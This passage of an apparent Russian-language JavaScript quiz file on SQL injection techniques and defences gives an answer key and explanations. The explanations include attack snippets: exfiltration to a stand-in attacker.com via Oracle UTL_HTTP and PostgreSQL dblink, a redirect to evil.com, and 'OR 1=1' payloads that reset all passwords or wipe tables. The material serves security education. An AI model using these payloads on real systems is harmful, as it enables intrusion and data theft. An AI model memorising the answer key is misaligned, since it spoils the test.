            "Используется для оптимизации SQL запросов путем автоматического создания необходимых индексов",
            "Возвращает версию базы данных и список установленных патчей безопасности в удобном формате",
            "Эта функция не существует в MySQL, она доступна только в PostgreSQL и Oracle под другим именем",
            "Злоумышленники используют её для скрытого майнинга криптовалюты на сервере жертвы"
        ],
        correctAnswerIndex: 0,
        explanation: "`BENCHMARK(10000000, MD5(1))` заставит сервер вычислить MD5 10 миллионов раз, что вызовет заметную задержку.",
        link: {
            label: "MySQL: BENCHMARK()",
            url: "https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_benchmark"
        }
    },
    {
        question: "В чем опасность SQL Injection в операторе `INSERT`?",
        answers: [
            "Можно создать нового пользователя с правами администратора, перезаписать данные других пользователей или внедрить XSS",
            "Можно полностью удалить базу данных одной командой, даже если нет прав на удаление (DELETE)",
            "Можно только добавить пустую строку в таблицу, что вызовет ошибку валидации данных но не взлом",
            "Оператор INSERT полностью безопасен, так как он только добавляет новые данные и не может читать существующие",
            "Никакой реальной опасности нет, так как современные фреймворки автоматически фильтруют INSERT запросы",
            "Можно только прочитать свои собственные данные, которые были добавлены в текущей сессии",
            "Это приведет только к ошибке дубликата первичного ключа, которую легко отследить в логах"
        ],
        correctAnswerIndex: 0,
        explanation: "Внедрение в `INSERT INTO users (user, pass, role) VALUES ('$user', ...)` позволяет передать `'admin', 'pass', 'admin') --` и получить полные права.",
        link: {
            label: "PortSwigger: SQLi in Insert",
            url: "https://portswigger.net/web-security/sql-injection"
        }
    },
    {
        question: "Как эксплуатируется SQL Injection в операторе `UPDATE`?",
        answers: [
            "Атакующий может изменить условие `WHERE`, чтобы обновить данные других пользователей (например, сбросить пароль админа)",
            "Атакующий может заставить страницу постоянно обновляться (Refresh), вызывая раздражение пользователей",
            "Это невозможно, так как `UPDATE` запросы не возвращают данных, поэтому инъекция бессмысленна",
            "Приводит к принудительному обновлению операционной системы Windows на сервере базы данных",
            "Инъекция возможна только если приложение использует оператор `DELETE` вместо `UPDATE` для изменения данных",
            "Атака успешна только если база данных пустая и в ней нет записей для обновления",
            "Используется исключительно для обновления картинки профиля пользователя на произвольное изображение"
        ],
        correctAnswerIndex: 0,
        explanation: "Если запрос `UPDATE users SET pass = '$new_pass' WHERE id = '$id'`, атакующий может послать `id = '1 OR 1=1'`, сбросив пароли всем пользователям.",
        link: {
            label: "OWASP: Testing for SQL Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
        }
    },
    {
        question: "Почему SQL Injection в `DELETE` может быть катастрофичным?",
        answers: [
            "Инъекция в `WHERE` может превратить запрос на удаление одной записи в удаление ВСЕХ записей в таблице (например, `OR 1=1`)",
            "Приводит к физическому удалению сервера из стойки в дата-центре через управление питанием",
            "Полностью удаляет доступ к интернету на сервере, блокируя сетевой интерфейс",
            "Это не опасно, так как современные базы данных имеют корзину, из которой данные легко восстановить",
            "Оператор `DELETE` в SQL не поддерживает секцию `WHERE`, поэтому инъекция туда невозможна",
            "Только очищает кэш запросов базы данных, что может временно замедлить работу сайта",
            "Все перечисленные варианты являются возможными последствиями SQL Injection в DELETE"
        ],
        correctAnswerIndex: 0,
        explanation: "Тривиальная инъекция `OR 1=1` в запросе на удаление приведет к полной, часто необратимой потере данных таблицы.",
        link: {
            label: "W3Schools: SQL Delete Injection",
            url: "https://www.w3schools.com/sql/sql_injection.asp"
        }
    },
    {
        question: "Зачем в Blind SQLi используются побитовые операции (Bitwise AND `&`, Shift `>>`)?",
        answers: [
            "Для оптимизации бинарного поиска: определение каждого бита символа требует меньше запросов, чем перебор (8 запросов на символ)",
            "Для шифрования извлекаемых данных, чтобы WAF не смог обнаружить утечку конфиденциальной информации",
            "Для работы с бинарными полями типа BLOB, которые невозможно прочитать обычными методами сравнения строк",
            "Побитовые операции не поддерживаются в стандарте SQL и не могут быть использованы в инъекциях",
            "Злоумышленники используют мощности сервера для скрытого майнинга криптовалют через битовые сдвиги",
            "Чтобы запутать системы обнаружения вторжений (IDS), так как они не понимают битовую логику",
            "Для увеличения скорости передачи данных по сети путем сжатия ответов на уровне битов"
        ],
        correctAnswerIndex: 0,
        explanation: "Вместо перебора `> 100`, `> 50`, побитовый поиск (`(ascii >> 5) & 1`) позволяет точно восстановить байт за 8 запросов.",
        link: {
            label: "HackTricks: Bitwise Blind SQLi",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection-1/blind-sql-injection"
        }
    },
    {
        question: "Что такое HTTP Parameter Pollution (HPP) в контексте SQL Injection?",
        answers: [
            "Передача нескольких параметров с одним именем (`id=1&id=2`). Разная обработка дубликатов на WAF и бэкенде позволяет пронести пейлоад",
            "Загрязнение параметров HTTP запроса случайным мусором для переполнения буфера обработки",
            "Принудительное использование небезопасного протокола HTTP вместо HTTPS для перехвата данных",
            "Передача слишком длинных параметров, превышающих лимит веб-сервера, для вызова дампа памяти",
            "Использование специальных 'pollution' символов, которые удаляют таблицу маршрутизации сервера",
            "Атака на экологические стандарты дата-центров путем увеличения энергопотребления серверов",
            "Смешивание методов GET и POST в одном запросе для обхода проверок на стороне сервера"
        ],
        correctAnswerIndex: 0,
        explanation: "Разные технологии по-разному обрабатывают дубликаты. ASP.NET соединяет их через запятую (`1,UNION...`), PHP берет последний. Это позволяет обходить фильтры.",
        link: {
            label: "OWASP: HTTP Parameter Pollution",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
        }
    },
    {
        question: "Как работает атака Error-Based SQL Injection через `EXTRACTVALUE()` в MySQL?",
        answers: [
            "Функция ожидает валидный XPath. Подача некорректного XPath (с результатом подзапроса) вызывает ошибку, содержащую данные результата",
            "Это специализированная функция для брутфорса паролей пользователей из хешированных значений в базе",
            "Она позволяет читать произвольные XML файлы с жесткого диска сервера через уязвимость парсера",
            "Это ошибка в конфигурации PHP интерпретатора, а не уязвимость самой базы данных MySQL",
            "Эта функция работает исключительно в базе данных Oracle и не применима к MySQL серверам",
            "Это штатный метод ускорения выполнения XML запросов, используемый администраторами баз данных",
            "Данная уязвимость была полностью устранена во всех версиях MySQL начиная с 5.0"
        ],
        correctAnswerIndex: 0,
        explanation: "Ограничение вывода ошибки — 32 символа. Для получения длинных данных нужно использовать `substring()` или `limit` в подзапросе.",
        link: {
            label: "HackTricks: Error Based SQLi",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection#error-based-sqli"
        }
    },
    {
        question: "Чем опасна SQL Injection в конструкции `ORDER BY`?",
        answers: [
            "Там нельзя использовать `UNION`, но можно успешно применять Error-Based и Time-Based (Boolean blind сложнее) инъекции",
            "Ничем не опасна, так как сортировка данных влияет только на их отображение и не дает доступа к скрытой информации",
            "Атакующий может отсортировать базу данных в обратном порядке, что нарушит логику работы приложения",
            "Существует риск удаления таблиц, если внедрить команду `DROP` в параметр сортировки",
            "В секции `ORDER BY` инъекции технически невозможны из-за особенностей парсинга SQL запросов",
            "Единственное последствие — возможность замедлить сортировку большой таблицы, вызвав DoS",
            "Можно изменить цветовую схему сайта, внедрив CSS код в параметры сортировки"
        ],
        correctAnswerIndex: 0,
        explanation: "Параметры сортировки часто подставляются напрямую. Атакующий может внедрить `(CASE WHEN (SELECT 1)=1 THEN id ELSE price END)` для Blind инъекции.",
        link: {
            label: "PortSwigger: SQLi in ORDER BY",
            url: "https://portswigger.net/web-security/sql-injection"
        }
    },
    {
        question: "Какая особенность SQL Injection в `LIMIT` (MySQL)?",
        answers: [
            "В `LIMIT` нельзя использовать `UNION`, но в старых версиях работало `PROCEDURE ANALYSE()`, сейчас — Time-Based инъекции",
            "В операторе `LIMIT` можно писать любые SQL команды без ограничений, что делает его крайне опасным",
            "Параметр `LIMIT` автоматически защищен во всех фреймворках и не требует дополнительной фильтрации",
            "В этой секции можно использовать только SQL комментарии, исполняемый код там не работает",
            "Инъекция в `LIMIT` немедленно вызывает критическую ошибку 500 сервера, что выдает атакующего",
            "Можно получить удаленное выполнение кода (RCE) сразу, без необходимости подбора паролей",
            "Никаких особенностей нет, это стандартная SQL инъекция, работающая как и в `WHERE`"
        ],
        correctAnswerIndex: 0,
        explanation: "Синтаксис `LIMIT` строгий. Частый вектор: `LIMIT 1,1 Procedure Analyse(...,...)` или просто Time-based через вычисления.",
        link: {
            label: "HackTricks: MySQL Injection",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection"
        }
    },
    {
        question: "Как можно эксплуатировать инъекцию в `GROUP BY`?",
        answers: [
            "Аналогично `ORDER BY`: можно использовать Time-Based, Error-Based и иногда изменять логику группировки для раскрытия данных",
            "Инъекция здесь возможна исключительно через оператор `HAVING`, сам `GROUP BY` безопасен",
            "Никак, группировка данных — это безопасная операция, которая происходит после выборки данных",
            "Группировка автоматически удаляет дубликаты строк, что делает невозможным использование `UNION` атак",
            "Можно только изменить способ группировки пользователей в отчетах, что не является критической уязвимостью",
            "Единственный риск — вызов отказа в обслуживании (DoS) при группировке очень больших таблиц",
            "Для эксплуатации уязвимости в `GROUP BY` необходимы права администратора базы данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Если инпут попадает в `GROUP BY column`, можно внедрить `column, (SELECT ...)` или условия для Blind SQLi.",
        link: {
            label: "Acunetix: SQLi in GROUP BY",
            url: "https://www.acunetix.com/blog/articles/sql-injection-via-group-by/"
        }
    },
    {
        question: "Для чего используется оператор `HAVING` в SQL инъекциях?",
        answers: [
            "Он фильтрует результаты ПОСЛЕ группировки, позволяя атакующему обходить фильтры `WHERE` или внедрять Blind инъекции",
            "Это полный аналог оператора `SELECT`, используемый только в диалекте T-SQL от Microsoft",
            "Это криптографическая функция хеширования, используемая для проверки целостности данных",
            "Используется для проверки наличия (having) известных уязвимостей в базе данных",
            "Это устаревший оператор из стандарта SQL-92, который больше не поддерживается современными базами",
            "Служит исключительно для ускорения выборки данных из больших таблиц с индексами",
            "Позволяет создавать новые таблицы 'на лету' на основе результатов выборки"
        ],
        correctAnswerIndex: 0,
        explanation: "В `HAVING` часто можно внедрять условия, которые выполняются для каждой группы, что полезно для Blind атак.",
        link: {
            label: "W3Schools: SQL HAVING",
            url: "https://www.w3schools.com/sql/sql_having.asp"
        }
    },
    {
        question: "В чем различие `ROWNUM` (Oracle) и `LIMIT` (MySQL) при эксплуатации Blind SQLi?",
        answers: [
            "`ROWNUM` применяется ДО сортировки (если нет вложенного запроса), а `LIMIT` — в конце. Это требует разных пейлоадов для извлечения данных",
            "Различий нет, это просто разные названия одного и того же оператора в разных базах данных",
            "Оператор `LIMIT` всегда работает быстрее, чем `ROWNUM`, поэтому его сложнее использовать для Time-Based атак",
            "`ROWNUM` — это встроенная функция языка PHP, а не SQL, поэтому она неуязвима к инъекциям",
            "`LIMIT` поддерживается всеми существующими базами данных, в отличие от проприетарного `ROWNUM`",
            "`ROWNUM` позволяет читать системные файлы операционной системы, в то время как `LIMIT` работает только с данными",
            "Они абсолютно идентичны по своему поведению и синтаксису, это синонимы в стандарте ANSI SQL"
        ],
        correctAnswerIndex: 0,
        explanation: "В Oracle для получения N-й строки часто нужно делать вложенный запрос: `SELECT * FROM (SELECT a.*, ROWNUM r FROM ... WHERE ROWNUM <= 5) WHERE r >= 5`.",
        link: {
            label: "PortSwigger: SQLi Cheatsheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Что позволяет сделать пакет `UTL_HTTP` в Oracle Database при SQL Injection?",
        answers: [
            "Отправлять произвольные HTTP запросы из базы данных, что позволяет реализовать OOB атаки (DNS/HTTP exfiltration)",
            "Читать локальные файлы с диска сервера, к которым у пользователя базы данных нет доступа",
            "Запускать системный калькулятор или другие приложения на сервере через удаленный вызов процедур",
            "Это встроенный веб-сервер Oracle, который используется для администрирования базы данных через браузер",
            "Это библиотека для языка Python, предназначенная для работы с HTTP протоколом, mistakenly включенная в Oracle",
            "Ничего опасного, этот пакет используется только для внутренней диагностики сетевых соединений",
            "Только принимать входящие HTTP запросы, работать в режиме сервера, но не отправлять их"
        ],
        correctAnswerIndex: 0,
        explanation: "Классический Out-of-Band вектор в Oracle: `SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||pass) FROM dual`.",
        link: {
            label: "HackTricks: Oracle OOB",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/oracle-injection#out-of-band-oob-interaction"
        }
    },
    {
        question: "Что такое `dblink` в PostgreSQL и чем он опасен?",
        answers: [
            "Расширение для подключения к другим БД. Позволяет делать запросы к удаленным серверам, что используется для SSRF и OOB атак",
            "Ссылка на облачное хранилище Dropbox для автоматического резервного копирования базы данных",
            "Стандартный HTML тег `<link>`, который ошибочно интерпретируется базой данных как команда",
            "Концепция 'двойной ссылки' в реляционной алгебре, обеспечивающая целостность данных",
            "Встроенный механизм инкрементального бэкапа данных в PostgreSQL, работающий в фоновом режиме",
            "Абсолютно безопасный драйвер подключения, исключающий любые возможности для SQL инъекций",
            "Функция для отладки производительности запросов, показывающая план выполнения (Explain Analyze)"
        ],
        correctAnswerIndex: 0,
        explanation: "`SELECT * FROM dblink('host=attacker.com...', 'SELECT user') ...` позволяет передать данные наружу или сканировать сеть из БД.",
        link: {
            label: "HackTricks: PostgreSQL dblink",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#dblink"
        }
    },
    {
        question: "Какое ограничение функции `LOAD_FILE()` в MySQL делает её использование сложным?",
        answers: [
            "Файл должен быть на сервере БД (не веб-сервере, если они разнесены), быть доступен для чтения пользователю системы (OS) и размер файла должен быть меньше `max_allowed_packet`",
            "Файл должен находиться в специальной директории `secure_uploads`, которая обязательно прописана в глобальном конфигурационном файле `my.cnf`",
            "Функция работает только если веб-сервер и сервер базы данных запущены на одной физической машине и имеют общего пользователя",
            "Размер файла не должен превышать статический лимит в 1 КБ, а имя файла должно быть закодировано в Hex перед передачей в запрос",
            "Файл должен иметь расширение `.txt` или `.log` и права доступа `777` (rwxrwxrwx) на уровне файловой системы Linux",
            "Функция доступна только для пользователей, подключенных через локальный сокет, и недоступна при сетевом подключении (TCP/IP)",
            "Функция автоматически удаляет файл после первого успешного чтения, поэтому данные можно получить только один раз"
        ],
        correctAnswerIndex: 0,
        explanation: "Плюс ограничение `secure_file_priv`, которое часто запрещает чтение из произвольных директорий (например, `/etc/passwd`).",
        link: {
            label: "MySQL: LOAD_FILE()",
            url: "https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file"
        }
    },
    {
        question: "В чем разница между `INTO OUTFILE` и `INTO DUMPFILE` в MySQL?",
        answers: [
            "`INTO OUTFILE` экранирует спецсимволы и форматирует строки (добавляет переносы). `INTO DUMPFILE` пишет данные 'как есть' (бинарно), что идеально для заливки бинарных шеллов или картинок",
            "`INTO OUTFILE` используется для экспорта таблиц целиком, а `INTO DUMPFILE` предназначен исключительно для создания полных резервных копий базы данных (backup)",
            "`INTO DUMPFILE` автоматически сжимает данные алгоритмом GZIP для экономии места на диске, тогда как `INTO OUTFILE` пишет несжатый текст",
            "`INTO OUTFILE` работает только со строковыми полями (VARCHAR, TEXT), а `INTO DUMPFILE` поддерживает только экспорт числовых типов данных и BLOB",
            "`INTO DUMPFILE` требует прав администратора (SUPER privilege), в то время как `INTO OUTFILE` доступен любому обычному пользователю с правами SELECT",
            "`INTO OUTFILE` записывает данные на клиентскую машину пользователя, а `INTO DUMPFILE` сохраняет файл на серверной стороне в директорию данных",
            "Разницы практически нет, это псевдонимы одной и той же команды, которые были сохранены для обратной совместимости со старыми версиями"
        ],
        correctAnswerIndex: 0,
        explanation: "Если вы пишете PHP шелл, `OUTFILE` может испортить код лишними экранированиями. `DUMPFILE` пишет ровно те байты, которые вы передали.",
        link: {
            label: "MySQL: SELECT ... INTO",
            url: "https://dev.mysql.com/doc/refman/8.0/en/select-into.html"
        }
    },
    {
        question: "Почему функция `mysql_real_escape_string()` (в старом PHP) не давала 100% зашиты?",
        answers: [
            "При неправильной настройке кодировки соединения (например, GBK) она пропускала инъекции (Wide Byte SQLi), а также не спасала от инъекций в `INT` параметры (где вообще не нужны кавычки)",
            "Эта функция экранировала только двойные кавычки, оставляя одинарные кавычки и обратные слэши доступными для внедрения вредоносного SQL кода",
            "Она работала только на стороне клиента (в PHP/Apache), поэтому данные могли быть перехвачены и модифицированы при передаче по сети через MITM атаку",
            "Функция не поддерживала корректную работу с кодировкой UTF-8, из-за чего все многобайтовые символы превращались в нечитаемые знаки вопроса",
            "Она удаляла все SQL ключевые слова (такие как SELECT, UNION, INSERT), что часто приводило к потере легитимных данных пользователей",
            "Использование этой функции вызывало значительные задержки в обработке запросов, так как требовало дополнительного обращения к серверу БД для проверки",
            "Она защищала только от инъекций в операторе WHERE, но была абсолютно бесполезна против инъекций в секциях ORDER BY или LIMIT"
        ],
        correctAnswerIndex: 0,
        explanation: "Безопасность зависит от контекста. Если вы подставляете строку в числовое поле (`id=$id`), экранирование кавычек бесполезно, так как `$id=1 OR 1=1` пройдёт.",
        link: {
            label: "StackOverflow: mysql_real_escape_string bypass",
            url: "https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string"
        }
    },
    {
        question: "Как работает 'Connection String Injection'?",
        answers: [
            "Если пользователь контролирует параметры строки подключения (например, `Data Source` или `Driver`), он может подменить драйвер или включить опасные опции (Ado.net)",
            "Атакующий перехватывает зашифрованную строку подключения в сетевом трафике и расшифровывает пароль базы данных методом полного перебора",
            "Это внедрение вредоносного JavaScript кода в поля базы данных, который выполняется при просмотре строки подключения администратором в консоли",
            "Атакующий создает тысячи одновременных подключений с базой данных, исчерпывая лимит соединений и вызывая отказ в обслуживании (DoS)",
            "Это подмена IP-адреса целевого сервера в DNS кэше, в результате чего приложение подключается к поддельной базе данных злоумышленника",
            "Внедрение специальных символов-разделителей в имя пользователя БД, которые позволяют получить права администратора при авторизации",
            "Использование уязвимостей в протоколе TCP/IP для перехвата активной сессии установленного соединения между сервером приложений и БД"
        ],
        correctAnswerIndex: 0,
        explanation: "Например, внедрение параметра `Server=evil.com` может направить подключение приложения к подконтрольному злоумышленнику серверу БД.",
        link: {
            label: "OWASP: Connection String Parameter Pollution",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
        }
    },
    {
        question: "Что такое HQL Injection (Hibernate Query Language)?",
        answers: [
            "Инъекция в ORM-запросы Hibernate. Структура похожа на SQL, но атакующий оперирует объектами и свойствами, а не таблицами. `UNION` часто недоступен, но `WHERE` условия работают",
            "Это разновидность XSS атаки, специфичная для Java приложений, использующих фреймворк Hibernate для рендеринга динамических страниц",
            "Атака, направленная на подмену конфигурационных XML файлов Hibernate для получения несанкционированного доступа к файловой системе",
            "Внедрение вредоносного байт-кода в Java классы через сериализованные объекты, передаваемые в параметрах запросов Hibernate",
            "Тип инъекции, который работает исключительно в NoSQL базах данных, подключенных к приложению через Hibernate OGM драйвер",
            "Перехват и модификация SQL запросов, генерируемых Hibernate, на уровне JDBC драйвера непосредственно перед отправкой в базу данных",
            "Это атака на уровне HTTP заголовков, позволяющая обойти механизмы аутентификации в Spring приложениях, использующих Hibernate"
        ],
        correctAnswerIndex: 0,
        explanation: '`FROM User WHERE name = \'" + param + "\'` в HQL так же уязвимо, как и в SQL. Можно сбромпрометировать данные, доступные через ORM мэппинг.',
        link: {
            label: "OWASP: HQL Injection",
            url: "https://owasp.org/www-community/vulnerabilities/HQL_Injection"
        }
    },
    {
        question: "Помогает ли CSP (Content Security Policy) защититься от SQL Injection?",
        answers: [
            "Нет, CSP защищает от XSS и Clickjacking, ограничивая источники скриптов. SQLi происходит на сервере, CSP на это никак не влияет",
            "Да, если настроить строгую директиву `script-src 'none'`, это полностью запретит выполнение любых SQL запросов, инициированных из JavaScript",
            "Частично, CSP может заблокировать попытки выгрузки данных на сторонний домен (OAST), если атакующий пытается использовать Out-of-Band вектора",
            "Только если используется директива `connect-src 'self'`, которая принудительно запрещает приложению соединяться с внешними базами данных",
            "Да, современные браузеры с поддержкой CSP 3.0 умеют автоматически детектировать и блокировать подозрительные SQL-паттерны в URL строке",
            "Нет, но CSP позволяет принудительно включить SSL/TLS шифрование трафика между клиентом и сервером, что усложняет эксплуатацию SQLi",
            "Да, если использовать `sandbox` директиву, которая изолирует процесс базы данных от остального веб-сервера в песочнице"
        ],
        correctAnswerIndex: 0,
        explanation: "Это распростанённое заблуждение. Меры защиты должны применяться на сервере (Prepared Statements).",
        link: {
            label: "MDN: CSP",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
        }
    },
    {
        question: "Как техника 'Chunked Transfer Encoding' помогает обойти WAF при SQL инъекциях?",
        answers: [
            "Атакующий разбивает запрос на мелкие чанки, которые WAF может не собрать воедино для анализа сигнатур (Request Smuggling / WAF Bypass)",
            "Атакующий кодирует весь SQL запрос в Base64 и передает его частями в заголовках, чтобы скрыть ключевые слова от сигнатурного анализатора",
            "Использование специального HTTP заголовка `X-SQL-Chunk`, который инструктирует WAF пропускать содержимое тела запроса без проверки",
            "Отправка запроса по протоколу UDP вместо TCP, что позволяет передавать данные в обход WAF, работающего только на уровне HTTP/TCP",
            "Атакующий предварительно сжимает тело запроса алгоритмом GZIP с максимальной степенью сжатия, которую WAF не успевает распаковать 'на лету'",
            "Разбиение SQL команды пробелами и многострочными комментариями так, чтобы каждый фрагмент передавался в отдельном GET параметре",
            "Использование HTTPS соединения с нестандартным алгоритмом шифрования, ключи от которого есть у веб-сервера, но отсутствуют у WAF"
        ],
        correctAnswerIndex: 0,
        explanation: "Многие WAF анализируют только первые N байт или не поддерживают потоковую сборку `Transfer-Encoding: chunked`.",
        link: {
            label: "Acunetix: HTTP Smuggling WAF Bypass",
            url: "https://www.acunetix.com/blog/articles/http-request-smuggling/"
        }
    },
    {
        question: "В чем суть атаки 'SQL Truncation'?",
        answers: [
            "Если БД молча обрезает длинные строки (например, VARCHAR(4)), атакующий может зарегистрировать `admin   ...` (с пробелами), который обрежется до `admin`, совпадая с логином администратора",
            "Атака, при которой база данных выполняет команду `TRUNCATE TABLE`, удаляя все записи из целевой таблицы без возможности восстановления",
            "Переполнение буфера памяти процесса базы данных слишком длинным SQL запросом, приводящее к аварийному завершению работы службы (Crash)",
            "Обход проверки минимальной длины пароля путем передачи пустой строки, которая после 'обрезания' пробелов становится валидной",
            "Использование оператора `DROP` вместо `DELETE` для скрытого удаления логов аудита безопасности и заметания следов проникновения",
            "Ошибка округления дробных чисел при конвертации типов `FLOAT` в `INT`, позволяющая изменить стоимость товара в корзине до нуля",
            "Срезание последних символов в зашифрованном пароле (хеше), что позволяет злоумышленнику подобрать коллизию и войти под чужим аккаунтом"
        ],
        correctAnswerIndex: 0,
        explanation: "В старых версиях MySQL (при выключенном Strict Mode) это позволяло получить доступ к аккаунту с тем же логином (после обрезки), но своим паролем.",
        link: {
            label: "HackTricks: SQL Truncation",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection#sql-truncation"
        }
    },
    {
        question: "Как работает обход WAF через 'HTTP Parameter Pollution' (HPP) в ASP.NET?",
        answers: [
            "ASP.NET объединяет значения одноименных параметров (`id=1&id=OR 1=1`) в строку через запятую (`1, OR 1=1`). Если приложение берет эту строку в SQL, получается инъекция",
            "ASP.NET автоматически удаляет все дублирующиеся параметры кроме первого, поэтому WAF проверяет только легитимный `id=1`, пропуская атаку",
            "WAF блокирует только POST запросы с дублирующимися параметрами, но пропускает аналогичные GET запросы, которые затем обрабатываются сервером",
            "Передача параметров с одинаковыми именами вызывает переполнение стека в IIS, что приводит к временному отключению модуля безопасности WAF",
            "ASP.NET шифрует параметры `ViewState` при дублировании, скрывая от WAF вредоносную полезную нагрузку во втором параметре",
            "Второй параметр перезаписывает первый в объекте `HttpRequest`, поэтому приложение видит атаку, хотя WAF проанализировал только первый параметр",
            "Атака заставляет сервер переключиться в режим отладки (Debug Mode), в котором отключаются стандартные фильтры безопасности входных данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий может разбить сигнатуру атаки (`UNION`, `SELECT`) по разным параметрам, чтобы WAF не увидел целую фразу.",
        link: {
            label: "OWASP: HPP",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
        }
    },
    {
        question: "Как GraphQL может быть вектором для инъекций?",
        answers: [
            "Аргументы полей GraphQL могут передаваться в SQL/NoSQL запросы без валидации. Также возможны специфические атаки (Introspection, Batching DoS)",
            "GraphQL запросы всегда автоматически экранируются на уровне библиотеки, поэтому классические инъекции невозможны, в отличие от REST API",
            "GraphQL использует собственную высокоскоростную графовую базу данных, которая не подвержена SQL инъекциям из-за отсутствия языка SQL",
            "Инъекции возможны только если в GraphQL эндпоинте включен режим `debug: true`, который раскрывает внутреннюю структуру базы данных",
            "Атакующий может внедрить вредоносные схемы (Schema Injection) в определение типов GraphQL, нарушая целостность данных приложения",
            "GraphQL спецификация запрещает использование вложенных запросов, что делает технически невозможным использование UNION Based инъекций",
            "Уязвимость возникает только при использовании определенных клиентских библиотек (например, Apollo), другие реализации GraphQL безопасны"
        ],
        correctAnswerIndex: 0,
        explanation: "Если резолвер делает `db.query(\"SELECT * FROM users WHERE id = \" + args.id)`, это классическая SQLi.",
        link: {
            label: "PortSwigger: GraphQL API vulnerabilities",
            url: "https://portswigger.net/web-security/graphql"
        }
    },
    {
        question: "Что такое 'Wide Byte SQL Injection'?",
        answers: [
            "При использовании двухбайтовых кодировок (GBK, BIG5) атакующий добавляет байт (например, `%bf`), который 'съедает' обратный слэш экранирования (`%5c`), делая кавычку валидной",
            "Атака, использующая уязвимость переполнения буфера в старых версиях MySQL при обработке слишком широких текстовых полей (типа `LONGTEXT`)",
            "Внедрение SQL кода через параметры, ожидающие данные с плавающей точкой (`DOUBLE` или `FLOAT`), известные как 'широкие' типы данных",
            "Использование символов из диапазона Emoji (4 байта) для скрытия вредоносной полезной нагрузки от простых строковых фильтров WAF",
            "Атака на веб-интерфейсы с фиксированной шириной полей ввода, позволяющая выйти за визуальные границы и передать скрытые данные",
            "Подмена кодировки HTTP-ответа сервера на UTF-16, чтобы браузер жертвы интерпретировал текст SQL ошибки как исполняемый JavaScript код",
            "Использование невидимых пробельных символов нестандартной ширины (zero-width space) для обхода фильтрации ключевых слов SQL"
        ],
        correctAnswerIndex: 0,
        explanation: "Комбинация `%bf%5c` воспринимается как один китайский иероглиф, и экранирование `\'` превращается в `縗'`.",
        link: {
            label: "HackTricks: Wide Byte SQLi",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection#wide-byte-sql-injection"
        }
    },
    {
        question: "Может ли SQL Injection вызвать отказ в обслуживании (DoS)?",
        answers: [
            "Да, через ресурсоемкие функции (`BENCHMARK`, сложные `JOIN`, рекурсивные CTE) или блокировку таблиц/строк (`SELECT FOR UPDATE`)",
            "Нет, современные СУБД имеют встроенную защиту от длительных запросов и автоматически прерывают их выполнение через фиксированный таймаут",
            "Только если атакующий уже имеет права администратора базы данных (DBA), чтобы вручную останавливать критически важные системные процессы",
            "Нет, так как веб-сервер (например, Nginx или Apache) разрывает соединение с клиентом раньше, чем база данных успеет полностью зависнуть",
            "Да, но только путем переполнения дискового пространства сервера базы данных бесконечной вставкой строк (так называемый INSERT flood)",
            "Только в случае использования Microsoft SQL Server, так как другие базы данных работают в изолированных контейнерах с ограничением ресурсов",
            "Да, если атакующий сможет удалить все индексы в ключевых таблицах, что катастрофически замедлит работу всех легитимных запросов"
        ],
        correctAnswerIndex: 0,
        explanation: 'Один "тяжелый" запрос может положить CPU базы данных на 100%, блокируя обслуживание легитимных пользователей.',
        link: {
            label: "OWASP: Denial of Service",
            url: "https://owasp.org/www-community/attacks/Denial_of_Service"
        }
    },
    {
        question: "Какие ограничения есть у `PreparedStatement` (параметризованных запросов)?",
        answers: [
            "Нельзя использовать плейсхолдеры (`?`) для имен таблиц, колонок или порядка сортировки (`ORDER BY ?`). В этих местах часто приходится использовать конкатенацию или белые списки",
            "Prepared Statements защищают только от инъекций в POST запросах (данные формы), но абсолютно бесполезны для защиты параметров в URL (GET)",
            "Параметризованные запросы официально не поддерживаются в PHP версии ниже 7.0, поэтому на старых legacy системах они не будут работать",
            "Они имеют жесткое ограничение на длину передаваемых данных в 256 байт, что делает невозможным их использование для сохранения больших текстов",
            "Использование Prepared Statements увеличивает нагрузку на процессор сервера в несколько раз из-за необходимости предварительной компиляции",
            "Плейсхолдеры можно использовать только для строковых типов данных (String), числа и даты все равно приходится конкатенировать вручную",
            "Они не защищают от инъекций второго порядка (Second Order SQLi), так как данные уже находятся в базе и считаются доверенными"
        ],
        correctAnswerIndex: 0,
        explanation: "Разработчики часто ошибаются, делая `ORDER BY $col`, думая, что раз `WHERE id=?` безопасно, то и тут безопасно. Это вектор для SQLi.",
        link: {
            label: "OWASP: SQL Injection Prevention Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "В чем главное отличие NoSQL Injection от SQL Injection?",
        answers: [
            "В синтаксисе: NoSQL часто использует JSON или JavaScript, поэтому инъекции выглядят как `{\"$ne\": null}` (MongoDB) или замыкания JS, а не `' OR 1=1 --`",
            "Главное отличие в том, что NoSQL базы данных не поддерживают авторизацию пользователей, поэтому инъекции там эксплуатировать значительно проще",
            "NoSQL инъекции всегда направлены исключительно на получение удаленного выполнения кода (RCE), а не на кражу информации из базы данных",
